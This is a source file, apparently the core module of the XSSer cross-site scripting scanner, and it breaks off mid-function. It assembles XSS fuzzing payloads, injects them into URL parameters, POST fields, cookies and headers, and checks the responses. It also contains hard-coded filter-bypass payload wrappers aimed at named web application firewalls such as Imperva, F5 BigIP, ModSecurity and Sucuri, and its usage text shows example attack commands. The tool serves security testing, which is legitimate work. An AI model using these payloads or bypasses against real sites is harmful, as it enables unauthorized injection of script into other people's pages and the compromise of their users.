#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:
"""
This file is part of the XSSer project, https://xsser.03c8.net

Copyright (c) 2010/2021 | psy <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os, re, sys, datetime, hashlib, time, cgi, traceback, webbrowser, random

try:
    import urllib.request, urllib.error, urllib.parse
except:
    print ("\n[Info] XSSer no longer supports Python2: (https://www.python.org/doc/sunset-python-2/). Try to run the tool with Python3.x.y... (ex: python3 xsser)\n")
    sys.exit()

from random import randint
from base64 import b64encode, b64decode
from http.cookies import SimpleCookie
import core.fuzzing
import core.fuzzing.vectors
import core.fuzzing.DCP
import core.fuzzing.DOM
import core.fuzzing.HTTPsr
import core.fuzzing.heuristic
from collections import defaultdict
from itertools import islice, chain
from urllib.parse import parse_qs, urlparse
from core.curlcontrol import Curl
from core.encdec import EncoderDecoder
from core.options import XSSerOptions
from core.dork import Dorker
from core.crawler import Crawler
from core.imagexss import ImageInjections
from core.flashxss import FlashInjections
from core.post.xml_exporter import xml_reporting
from core.tokenhub import HubThread
from core.reporter import XSSerReporter
from core.threadpool import ThreadPool, NoResultsPending
from core.update import Updater

# set to emit debug messages about errors (False = off).
DEBUG = False

class xsser(EncoderDecoder, XSSerReporter):
    """
    XSSer application class
    """
    def __init__(self, mothership=None):
        self._reporter = None
        self._reporters = []
        self._landing = False
        self._ongoing_requests = 0
        self._oldcurl = []
        self._gtkdir = None
        self._webbrowser = webbrowser
        self.crawled_urls = []
        self.checked_urls = []
        self.successful_urls = []
        self.urlmalformed = False
        self.search_engines = [] # available dorking search engines
        self.search_engines.append('bing') # [26/08/2019: OK!]
        self.search_engines.append('yahoo') # [26/08/2019: OK!]
        self.search_engines.append('startpage') # [26/08/2019: OK!]
        self.search_engines.append('duck') # [26/08/2019: OK!]
        #self.search_engines.append('google')
        #self.search_engines.append('yandex')
        self.user_template = None # wizard user template
        self.user_template_conntype = "GET" # GET by default
        self.check_tor_url = 'https://check.torproject.org/' # TOR status checking site

        if not mothership:
            # no mothership so *this* is the mothership
            # start the communications hub and rock on!
            self.hub = None
            self.pool = ThreadPool(0)
            self.mothership = None
            self.final_attacks = {}
        else:
            self.hub = None
            self.mothership = mothership
            self.mothership.add_reporter(self)
            self.pool = ThreadPool(0)
            self.final_attacks = self.mothership.final_attacks

        # initialize the url encoder/decoder
        EncoderDecoder.__init__(self)

        # your unique real opponent
        self.time = datetime.datetime.now()

        # this payload comes with vector already..
        self.DEFAULT_XSS_PAYLOAD = 'XSS'

        # to be or not to be...
        self.hash_found = []
        self.hash_notfound = []

        # other hashes
        self.hashed_injections={}
        self.extra_hashed_injections={}
        self.extra_hashed_vector_url = {}
        self.final_hashes = {} # final hashes used by each method

        # some counters for checker systems
        self.errors_isalive = 0
        self.next_isalive = False
        self.flag_isalive_num = 0
        self.rounds = 0
        self.round_complete = 0
        
        # some controls about targets
        self.urlspoll = []

        # some statistics counters for connections
        self.success_connection = 0
        self.not_connection = 0
        self.forwarded_connection = 0
        self.other_connection = 0

        # some statistics counters for payloads
        self.xsr_injection = 0
        self.xsa_injection = 0
        self.coo_injection = 0
        self.manual_injection = 0
        self.auto_injection = 0
        self.dcp_injection = 0
        self.dom_injection = 0
        self.httpsr_injection = 0
        self.check_positives = 0
        
        # some statistics counters for injections found
        self.xsr_found = 0
        self.xsa_found = 0
        self.coo_found = 0
        self.manual_found = 0
        self.auto_found = 0
        self.dcp_found = 0
        self.dom_found = 0
        self.httpsr_found = 0
        self.false_positives = 0

        # some statistics counters for heuristic parameters
        self.heuris_hashes = []
        self.heuris_backslash_found = 0
        self.heuris_une_backslash_found = 0
        self.heuris_dec_backslash_found = 0
        self.heuris_backslash_notfound = 0
        self.heuris_slash_found = 0
        self.heuris_une_slash_found = 0
        self.heuris_dec_slash_found = 0
        self.heuris_slash_notfound = 0
        self.heuris_mayor_found = 0
        self.heuris_une_mayor_found = 0
        self.heuris_dec_mayor_found = 0
        self.heuris_mayor_notfound = 0
        self.heuris_minor_found = 0
        self.heuris_une_minor_found = 0
        self.heuris_dec_minor_found = 0
        self.heuris_minor_notfound = 0
        self.heuris_semicolon_found = 0
        self.heuris_une_semicolon_found = 0
        self.heuris_dec_semicolon_found = 0
        self.heuris_semicolon_notfound = 0
        self.heuris_colon_found = 0
        self.heuris_une_colon_found = 0
        self.heuris_dec_colon_found = 0
        self.heuris_colon_notfound = 0
        self.heuris_doublecolon_found = 0
        self.heuris_une_doublecolon_found = 0
        self.heuris_dec_doublecolon_found = 0
        self.heuris_doublecolon_notfound = 0
        self.heuris_equal_found = 0
        self.heuris_une_equal_found = 0
        self.heuris_dec_equal_found = 0
        self.heuris_equal_notfound = 0

        # xsser verbosity (0 - no output, 1 - dots only, 2+ - real verbosity)
        self.verbose = 2
        self.options = None

    def __del__(self):
        if not self._landing:
            self.land()

    def get_gtk_directory(self):
        if self._gtkdir:
            return self._gtkdir
        local_path = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                                  'gtk')
        if os.path.exists(local_path):
            self._gtkdir = local_path
            return self._gtkdir
        elif os.path.exists('/usr/share/xsser/gtk'):
            self._gtkdir = '/usr/share/xsser/gtk'
            return self._gtkdir

    def set_webbrowser(self, browser):
        self._webbrowser = browser

    def set_reporter(self, reporter):
        self._reporter = reporter

    def add_reporter(self, reporter):
        self._reporters.append(reporter)

    def remove_reporter(self, reporter):
        if reporter in self._reporters:
            self._reporters.remove(reporter)

    def generate_hash(self, attack_type='default'):
        """
        Generate a new hash for a type of attack.
        """
        date = str(datetime.datetime.now())
        encoded_hash = date + attack_type
        return hashlib.md5(encoded_hash.encode('utf-8')).hexdigest()

    def generate_numeric_hash(self): # 32 length as md5
        """
        Generate a new hash for numeric only XSS
        """
        newhash = ''.join(random.choice('0123456789') for i in range(32)) 
        return newhash

    def report(self, msg, level='info'):
        """
        Report some error from the application.

        levels: debug, info, warning, error
        """
        if self.verbose == 2:
            prefix = ""
            if level != 'info':
                prefix = "["+level+"] "
            print(msg)
        elif self.verbose:
            if level == 'error':
                sys.stdout.write("*")
            else:
                sys.stdout.write(".")
        for reporter in self._reporters:
            reporter.post(msg)
        if self._reporter:
            from twisted.internet import reactor
            reactor.callFromThread(self._reporter.post, msg)

    def set_options(self, options):
        """
        Set xsser options
        """
        self.options = options
        self._opt_request()

    def _opt_request(self):
        """
        Pass on some properties to Curl
        """
        options = self.options
        for opt in ['cookie', 'agent', 'referer',\
			'headers', 'atype', 'acred', 'acert',
			'proxy', 'ignoreproxy', 'timeout', 
            'delay', 'tcp_nodelay', 'retries', 
            'xforw', 'xclient', 'threads', 
            'dropcookie', 'followred', 'fli',
            'nohead', 'isalive', 'alt', 'altm',
            'ald'
			]:
            if hasattr(options, opt) and getattr(options, opt):
                setattr(Curl, opt, getattr(options, opt))

    def get_payloads(self):
        """
        Process payload options and make up the payload list for the attack.
        """
        options = self.options
    	# payloading sources for --auto
        payloads_fuzz = core.fuzzing.vectors.vectors
        if options.fzz_info or options.fzz_num or options.fzz_rand and not options.fuzz:
            self.options.fuzz = True
        # set a type for XSS auto-fuzzing vectors
        if options.fzz_info:
            fzz_payloads = []
            for fuzz in payloads_fuzz:
                if not fuzz["browser"] == "[Not Info]":
                    fzz_payloads.append(fuzz)
            payloads_fuzz = fzz_payloads
        # set a limit for XSS auto-fuzzing vectors
        if options.fzz_num:
            try:
                options.fzz_num = int(options.fzz_num)
            except:
                options.fzz_num = len(payloads_fuzz)
            fzz_num_payloads = []
            fzz_vector = 0
            for fuzz in payloads_fuzz:
                fzz_vector = fzz_vector + 1
                if int(fzz_vector) < int(options.fzz_num)+1:
                    fzz_num_payloads.append(fuzz)
            payloads_fuzz = fzz_num_payloads
        # set random order for XSS auto-fuzzing vectors
        if options.fzz_rand:
            try:
                from random import shuffle
                shuffle(payloads_fuzz) # shuffle paylods
            except:
                pass
        payloads_dcp = core.fuzzing.DCP.DCPvectors
        payloads_dom = core.fuzzing.DOM.DOMvectors
        payloads_httpsr = core.fuzzing.HTTPsr.HTTPrs_vectors
        manual_payload = [{"payload":options.script, "browser":"[manual_injection]"}]
        # sustitute payload for hash to check for false positives
        self.hashed_payload = "XSS"
        checker_payload = [{"payload":self.hashed_payload, "browser":"[hashed_precheck_system]"}]
        # heuristic parameters
        heuristic_params = core.fuzzing.heuristic.heuristic_test
        def enable_options_heuristic(payloads):
            if options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            return payloads
        if options.fuzz:
            payloads = payloads_fuzz
            if options.dcp:
                payloads = payloads + payloads_dcp
                if options.script:
                    payloads = payloads + manual_payload
                    if options.hash:
                        payloads = checker_payload + payloads
                        if options.inducedcode:
                            payloads = payloads + payloads_httpsr
                            if options.heuristic:
                                payloads = heuristic_params + payloads
                                if options.dom:
                                    payloads = payloads + payloads_dom
                    elif options.inducedcode:
                        payloads = payloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
                        elif options.dom:
                            payloads = payloads + payloads_dom
                    elif options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
                elif options.hash:
                    payloads = checker_payload + payloads
                    if options.inducedcode:
                        payloads = payloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
                        elif options.dom:
                            payloads = payloads + payloads_dom
                elif options.inducedcode:
                    payloads = payloads + payloads_httpsr
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
            elif options.script:
                payloads = payloads + manual_payload
                if options.hash:
                    payloads = checker_payload + payloads
                    if options.inducedcode:
                        payloads = payloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
            elif options.hash:
                payloads = checker_payload + payloads
                if options.inducedcode:
                    payloads = payloads + payloads_httpsr
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
                elif options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
                elif options.dom:
                    payloads = payloads + payloads_dom
            elif options.inducedcode:
                payloads = payloads + payloads_httpsr
                if options.hash:
                    payloads = checker_payload + payloads
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.dcp:
            payloads = payloads_dcp
            if options.script:
                payloads = payloads + manual_payload
                if options.hash:
                    payloads = checker_payload + payloads
                    if options.inducedcode:
                        payloads = payloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
            elif options.hash:
                payloads = checker_payload + payloads
                if options.inducedcode:
                    payloads = payloads + options.inducedcode
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
            elif options.inducedcode:
                payloads = payloads + payloads_httpsr
                if options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
                elif options.dom:
                    payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.script:
            payloads = manual_payload
            if options.hash:
                payloads = checker_payload + payloads
                if options.inducedcode:
                    payloads = payloads + payloads_httpsr
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
            elif options.inducedcode:
                payloads = payloads + payloads_httpsr
                if options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
                elif options.dom:
                    payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.inducedcode:
            payloads = payloads_httpsr
            if options.hash:
                payloads = checker_payload + payloads
                if options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.heuristic:
            payloads = heuristic_params
            if options.hash:
                payloads = checker_payload + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.dom:
            payloads = payloads_dom
        elif not options.fuzz and not options.dcp and not options.script and not options.hash and not options.inducedcode and not options.heuristic and not options.dom:
            payloads = [{"payload":'">PAYLOAD',
			 "browser":"[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"
                         }]
        else:
            payloads = checker_payload
        return payloads

    def process_ipfuzzing(self, text):
        """
        Mask ips in given text to DWORD
        """
        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
        for ip in ips:
            text = text.replace(ip, str(self._ipDwordEncode(ip)))
        return text

    def process_ipfuzzing_octal(self, text):
        """
       	Mask ips in given text to Octal
	    """
        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
        for ip in ips:
            text = text.replace(ip, str(self._ipOctalEncode(ip)))
        return text

    def process_payloads_ipfuzzing(self, payloads):
        """
        Mask ips for all given payloads using DWORD
        """
        # ip fuzzing (DWORD)
        if self.options.Dwo:
            resulting_payloads = []
            for payload in payloads:
                payload["payload"] = self.process_ipfuzzing(payload["payload"])
                resulting_payloads.append(payload)
            return resulting_payloads
        return payloads

    def process_payloads_ipfuzzing_octal(self, payloads):
        """
        Mask ips for all given payloads using OCTAL
        """
        # ip fuzzing (OCTAL)
        if self.options.Doo:
            resulting_payloads = []
            for payload in payloads:
                payload["payload"] = self.process_ipfuzzing_octal(payload["payload"])
                resulting_payloads.append(payload)
            return resulting_payloads
        return payloads

    def get_query_string(self):
        """
        Get the supplied query string.
        """
        if self.options.postdata:
            return self.options.postdata
        elif self.options.getdata:
            return self.options.getdata
        return ""

    def attack_url(self, url, payloads, query_string):
        """
        Attack the given url checking or not if is correct.
        """
        if not self.options.nohead:
            for payload in payloads:
                self.rounds = self.rounds + 1
                self.attack_url_payload(url, payload, query_string)
        else:
            hc = Curl()
            try:
                urls = hc.do_head_check([url])
            except:
                self.report("[Error] Target URL: (" + url + ") is malformed!" + " [DISCARDED]" + "\n")
                return
            self.report("-"*50 + "\n")
            if str(hc.info()["http-code"]) in ["200", "302", "301", "401"]:
                if str(hc.info()["http-code"]) in ["301"]:
                    url = str(hc.info()["Location"])
                    payload = ""
                    query_string = ""
                elif str(hc.info()["http-code"]) in ["302"]:
                    url = url + "/"
                    payload = ""
                    query_string = ""
                self.success_connection = self.success_connection + 1
                self.report("[Info] HEAD-CHECK: OK! [HTTP-" + hc.info()["http-code"] + "] -> [AIMED]\n")
                for payload in payloads:
                    self.attack_url_payload(url, payload, query_string)
            else:
                if str(hc.info()["http-code"]) in ["405"]:
                    self.report("[Info] HEAD-CHECK: NOT ALLOWED! [HTTP-" + hc.info()["http-code"] + "] -> [PASSING]\n")
                    self.success_connection = self.success_connection + 1
                    for payload in payloads:
                        self.attack_url_payload(url, payload, query_string)
                else:
                    self.not_connection = self.not_connection + 1
                    self.report("[Error] HEAD-CHECK: FAILED! [HTTP-" + hc.info()["http-code"] + "] -> [DISCARDED]\n")
            self.report("-"*50 + "\n")

    def not_keyword_exit(self):
        self.report("="*30)
        self.report("\n[Error] XSSer cannot find a correct place to start an attack. Aborting!...\n")
        self.report("-"*25)
        self.report("\n[Info] This is because you aren't providing:\n\n At least one -payloader- using a keyword: 'XSS' (for hex.hash) or 'X1S' (for int.hash):\n")
        self.report("  - ex (GET): xsser -u 'https://target.com' -g '/path/profile.php?username=bob&surname=XSS&age=X1S&job=XSS'")
        self.report("  - ex (POST): xsser -u 'https://target.com/login.php' -p 'username=bob&password=XSS&captcha=X1S'\n")
        self.report(" Any extra attack(s) (Xsa, Xsr, Coo, Dorker, Crawler...):\n")
        self.report("  - ex (GET+Cookie): xsser -u 'https://target.com' -g '/path/id.php?=2' --Coo")
        self.report("  - ex (POST+XSA+XSR+Cookie): xsser -u 'https://target.com/login.php' -p 'username=admin&password=admin' --Xsa --Xsr --Coo")
        self.report("  - ex (Dorker): xsser -d 'news.php?id=' --Da")
        self.report("  - ex (Crawler): xsser -u 'https://target.com' -c 100 --Cl\n")
        self.report(" Or a mixture:\n")
        self.report("  - ex (GET+Manual): xsser -u 'https://target.com' -g '/users/profile.php?user=XSS&salary=X1S' --payload='<script>alert(XSS);</script>'")
        self.report("  - ex (POST+Manual): xsser -u 'https://target.com/login.asp' -p 'username=bob&password=XSS' --payload='}}%%&//<sc&ri/pt>(XSS)--;>'\n")
        self.report("  - ex (GET+Cookie): xsser -u 'https://target.com' -g '/login.asp?user=bob&password=XSS' --Coo")
        self.report("  - ex (POST+XSR+XSA): xsser -u 'https://target.com/login.asp' -p 'username=bob&password=XSS' --Xsr --Xsa\n")
        self.report("="*75 + "\n")
        if not self.options.xsser_gtk:
            sys.exit(2)
        else:
            pass

    def get_url_payload(self, url, payload, query_string, user_attack_payload):
        """
        Attack the given url within the given payload
        """
        options = self.options
        self._ongoing_attacks = {}
        if (self.options.xsa or self.options.xsr or self.options.coo):
            agent, referer, cookie  = self._prepare_extra_attacks(payload)
        else:
            agents = [] # user-agents
            try:
                f = open("core/fuzzing/user-agents.txt").readlines() # set path for user-agents
            except:
                f = open("fuzzing/user-agents.txt").readlines() # set path for user-agents when testing
            for line in f:
                agents.append(line)
            agent = random.choice(agents).strip() # set random user-agent
            referer = "127.0.0.1"
            cookie = None

        if options.agent:
            agent = options.agent
        else:
            self.options.agent = agent
        if options.referer:
            referer = options.referer
        else:
            self.options.referer = referer
        if options.cookie: # set formatted by user cookies
            cookie = options.cookie
        else:
            self.options.cookie = cookie

        # get payload/vector
        payload_string = payload['payload'].strip()
  
        ### Anti-antiXSS exploits
        # PHPIDS (>0.6.5) [ALL] -> 32*payload + payload
        if options.phpids065:
            payload_string = 32*payload_string + payload_string

        # PHPIDS (>0.7) [ALL] -> payload: 'svg-onload' (23/04/2016)
        if options.phpids070:
            payload_string = '<svg+onload=+"'+payload_string+'">'

        # Imperva Incapsula [ALL] -> payload: 'img onerror' + payload[DoubleURL+HTML+Unicode] 18/02/2016 
        if options.imperva:
            payload_string = '<img src=x onerror="'+payload_string+'">'

        # WebKnight (>4.1) [Chrome] payload: 'details ontoggle' 18/02/2016 
        if options.webknight:
            payload_string = '<details ontoggle='+payload_string+'>'

        # F5BigIP [Chrome+FF+Opera] payload: 'onwheel' 18/02/2016 
        if options.f5bigip:
            payload_string = '<body style="height:1000px" onwheel="'+payload_string+'">'
 
        # Barracuda WAF [ALL] payload: 'onwheel' 18/02/2016 
        if options.barracuda:
            payload_string = '<body style="height:1000px" onwheel="'+payload_string+'">'

        # Apache / modsec [ALL] payload: special 18/02/2016 
        if options.modsec:
            payload_string = '<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover='+payload_string+'>'

        # QuickDefense [Chrome] payload: 'ontoggle' + payload[Unicode] 18/02/2016 
        if options.quickdefense:
            payload_string = '<details ontoggle="'+payload_string+'">'
        
        # SucuriWAF [ALL] payload: 'ontoggle' + payload[Unicode] 18/02/2016 
        if options.sucuri:
           payload_string = '<a+id="a"href=javascript%26colon;alert%26lpar;'+payload_string+'%26rpar;+id="a" style=width:100%25;height:100%25;position:fixed;left:0;top:0 x>Y</a>'

        # Firefox 12 (and below) # 09/2019
        if options.firefox:
            payload_string = "<script type ='text/javascript'>"+payload_string+"</script>"

        # Chrome 19 (and below, but also Firefox 12 and below) # 09/2019
        if options.chrome:
            payload_string = "<script>/*///*/"+payload_string+"</script>"

        # Internet Explorer 9 (but also Firefox 12 and below) # 09/2019
        if options.iexplorer:
            payload_string = 'cooki1%3dvalue1;%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<html><body><script>'+payload_string+'</script></body></html>'

        # Opera 10.6 (but also IE6) # 09/2019
        if options.opera:
            payload_string = "<Table background = javascript: alert ("+payload_string+")> </ table>"

        # Substitute the attacking hash
        if 'PAYLOAD' in payload_string or 'VECTOR' in payload_string:
            payload_string = payload_string.replace('PAYLOAD', self.DEFAULT_XSS_PAYLOAD)
            payload_string = payload_string.replace('VECTOR', self.DEFAULT_XSS_PAYLOAD)

        hashed_payload = payload_string

        # Imperva
        if options.imperva:
            hashed_payload = urllib.parse.urlencode({'':hashed_payload})
            hashed_payload = urllib.parse.urlencode({'':hashed_payload}) #DoubleURL encoding
            hashed_payload = cgi.escape(hashed_payload) # + HTML encoding
            hashed_payload = str(hashed_payload) # + Unicode

        # Quick Defense
        if options.quickdefense:
            hashed_payload = str(hashed_payload) # + Unicode

        # apply user final attack url payload
        if user_attack_payload:
            hashed_vector_url = self.encoding_permutations(user_attack_payload)
        else:
            hashed_vector_url = self.encoding_permutations(hashed_payload)

        # replace special payload string also for extra attacks
        if self.extra_hashed_injections:
            hashed_payload = hashed_payload.replace('XSS', 'PAYLOAD')
            for k, v in self.extra_hashed_injections.items():
                if v[1] in hashed_payload:
                    self.extra_hashed_vector_url[k] = v[0], hashed_payload
            self.extra_hashed_injections = self.extra_hashed_vector_url
        if not options.getdata: # using GET as a single input (-u)
            target_url = url
        else:
            if not url.endswith("/") and not options.getdata.startswith("/"):
                url = url + "/"
            target_url = url + options.getdata
        if not options.dom:
            p_uri = urlparse(target_url, allow_fragments=False) # not fragments keyword '#' allowed
        else:
            p_uri = urlparse(target_url, allow_fragments=True)
        uri = p_uri.netloc
        path = p_uri.path
        if not uri.endswith('/') and not path.startswith('/'):
            uri = uri + "/"
        if self.options.target or self.options.crawling: # for audit entire target allows target without 'XSS/X1S' keyword
            if not "XSS" in target_url:
                if not target_url.endswith("/"):
                    target_url = target_url + "/XSS"
                else:
                    target_url = target_url + "XSS"
        target_params = parse_qs(urlparse(target_url).query, keep_blank_values=True)
        if self.options.script:
            if not 'XSS' in self.options.script and not self.options.crawling: # 'XSS' keyword used to change PAYLOAD at target_params
                self.not_keyword_exit()
        if not target_params and not options.postdata:
            if not self.options.xsa and not self.options.xsr and not self.options.coo: # extra attacks payloads
                if not 'XSS' in target_url and not 'X1S' in target_url and not self.options.crawling: # not any payloader found!
                    self.not_keyword_exit()
                else: # keyword found at target url (ex: https://target.com/XSS)
                    if 'XSS' in target_url:
                        url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                    elif 'X1S' in target_url:
                        url_orig_hash = self.generate_numeric_hash() # new hash for each parameter with an injection
                    hashed_payload = payload_string.replace('XSS', url_orig_hash)
                    if "[B64]" in hashed_payload: # [DCP Injection]
                        dcp_payload = hashed_payload.split("[B64]")[1]
                        dcp_preload = hashed_payload.split("[B64]")[0]
                        dcp_payload = b64encode(dcp_payload)
                        hashed_payload = dcp_preload + dcp_payload
                    self.hashed_injections[url_orig_hash] = target_url
                    if user_attack_payload:
                        pass
                    else:
                        hashed_vector_url = self.encoding_permutations(hashed_payload)
                    target_params[''] = hashed_vector_url # special target_param when XSS only at target_url
                    target_url_params = urllib.parse.urlencode(target_params)
                    if not uri.endswith('/') and not path.startswith('/'):
                        uri = uri + "/"
                    if path.endswith('/'):
                        path = path.replace('/',"")
                    if not options.getdata:
                        dest_url = url
                    else:
                        dest_url = url + options.getdata
                    if not "XSS" in dest_url:
                        dest_url = dest_url + hashed_vector_url
                    else:
                        if 'XSS' in dest_url:
                            dest_url = dest_url.replace('XSS', hashed_vector_url)
                        if 'X1S' in dest_url:
                            dest_url = dest_url.replace('X1S', hashed_vector_url)
            else:
                if 'XSS' in target_url:
                    url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                elif 'X1S' in target_url:
                    url_orig_hash = self.generate_numeric_hash() # new hash for each parameter with an injection
                hashed_payload = payload_string.replace('XSS', url_orig_hash)
                if "[B64]" in hashed_payload: # [DCP Injection]
                    dcp_payload = hashed_payload.split("[B64]")[1]
                    dcp_preload = hashed_payload.split("[B64]")[0]
                    dcp_payload = b64encode(dcp_payload)
                    hashed_payload = dcp_preload + dcp_payload
                self.hashed_injections[url_orig_hash] = target_url
                if user_attack_payload:
                    pass
                else:
                    hashed_vector_url = self.encoding_permutations(hashed_payload)
                target_params[''] = hashed_vector_url # special target_param when XSS only at target_url
                target_url_params = urllib.parse.urlencode(target_params)
                if not uri.endswith('/') and not path.startswith('/'):
                    uri = uri + "/"
                dest_url = p_uri.scheme + "://" + uri + path
                if 'XSS' in dest_url:
                    dest_url = dest_url.replace('XSS', hashed_vector_url)
                if 'X1S' in dest_url:
                    dest_url = dest_url.replace('X1S', hashed_vector_url)
                dest_url = p_uri.scheme + "://" + uri + path + "?" + target_url_params
        else:
            if not options.postdata:
                r = 0
                for key, value in target_params.items(): # parse params searching for keywords
                    for v in value:
                        if v == 'XSS' or v == 'X1S': # user input keywords where inject a payload
                            if v == 'XSS':
                                url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                            elif v == 'X1S':
                                url_orig_hash = self.generate_numeric_hash() # new hash for each parameter with an injection
                            hashed_payload = payload_string.replace('XSS', url_orig_hash)
                            if "[B64]" in hashed_payload: # [DCP Injection]
                                dcp_payload = hashed_payload.split("[B64]")[1]
                                dcp_preload = hashed_payload.split("[B64]")[0]
                                dcp_payload = b64encode(dcp_payload)
                                hashed_payload = dcp_preload + dcp_payload
                            self.hashed_injections[url_orig_hash] = key
                            if user_attack_payload:
                                pass
                            else:
                                hashed_vector_url = self.encoding_permutations(hashed_payload)
                            target_params[key] = hashed_vector_url
                            r = r + 1
                        else:
                            if self.options.xsa or self.options.xsr or self.options.coo:
                                url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                                self.hashed_injections[url_orig_hash] = key
                                target_params[key] = v
                                r = r + 1
                            else:
                                target_params[key] = v
                if r == 0 and not self.options.xsa and not self.options.xsr and not self.options.coo and not self.options.crawling:
                    self.not_keyword_exit()
                payload_url = query_string.strip() + hashed_vector_url
                target_url_params = urllib.parse.urlencode(target_params)
                dest_url = p_uri.scheme + "://" + uri + path + "?" + target_url_params
            else: # using POST provided by parameter (-p)
                target_params = parse_qs(query_string, keep_blank_values=True)
                r = 0
                for key, value in target_params.items(): # parse params searching for keywords
                    for v in value:
                        if v == 'XSS' or v == 'X1S': # user input keywords where inject a payload
                            if v == 'XSS':
                                url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                            elif v == 'X1S':
                                url_orig_hash = self.generate_numeric_hash() # new hash for each parameter with an injection
                            hashed_payload = payload_string.replace('XSS', url_orig_hash)
                            if "[B64]" in hashed_payload: # [DCP Injection]
                                dcp_payload = hashed_payload.split("[B64]")[1]
                                dcp_preload = hashed_payload.split("[B64]")[0]
                                dcp_payload = b64encode(dcp_payload)
                                hashed_payload = dcp_preload + dcp_payload
                            self.hashed_injections[url_orig_hash] = key
                            if user_attack_payload:
                                pass
                            else:
                                hashed_vector_url = self.encoding_permutations(hashed_payload)
                            target_params[key] = hashed_vector_url
                            r = r + 1
                        else:
                            if self.options.xsa or self.options.xsr or self.options.coo:
                                url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                                self.hashed_injections[url_orig_hash] = key
                                target_params[key] = v
                                r = r + 1
                            else:
                                target_params[key] = v
                if r == 0 and not self.options.xsa and not self.options.xsr and not self.options.coo and not self.options.crawling:
                    self.not_keyword_exit()
                target_url_params = urllib.parse.urlencode(target_params)
                dest_url = target_url_params
        self._ongoing_attacks['url'] = url_orig_hash
        if payload['browser'] == "[Document Object Model Injection]": # url decoding/unquote DOM payloads to execute url #fragments
            dest_url = urllib.parse.unquote(dest_url)
        return dest_url, agent, referer, cookie

    def attack_url_payload(self, url, payload, query_string):
        if not self.pool:
            pool = self.mothership.pool
        else:
            pool = self.pool
        c = Curl()
        if self.options.headers: # add extra headers
            headers = self.options.headers
        else:
            headers = None
        if self.options.getdata or not self.options.postdata:
            dest_url, agent, referer, cookie = self.get_url_payload(url, payload, query_string, None)
            def _cb(request, result):
                self.finish_attack_url_payload(c, request, result, payload,
                                               query_string, url, dest_url)
            _error_cb = self.error_attack_url_payload
            def _error_cb(request, error):
                self.error_attack_url_payload(c, url, request, error)
            c.agent = agent
            c.referer = referer
            c.cookie = cookie
            if " " in dest_url: # parse blank spaces
                dest_url = dest_url.replace(" ", "+")
            pool.addRequest(c.get, [[dest_url, headers]], _cb, _error_cb)
            self._ongoing_requests += 1
        if self.options.postdata:
            dest_url, agent, referer, cookie = self.get_url_payload("", payload, query_string, None)
            def _cb(request, result):
                self.finish_attack_url_payload(c, request, result, payload,
                                               query_string, url, dest_url)
            _error_cb = self.error_attack_url_payload
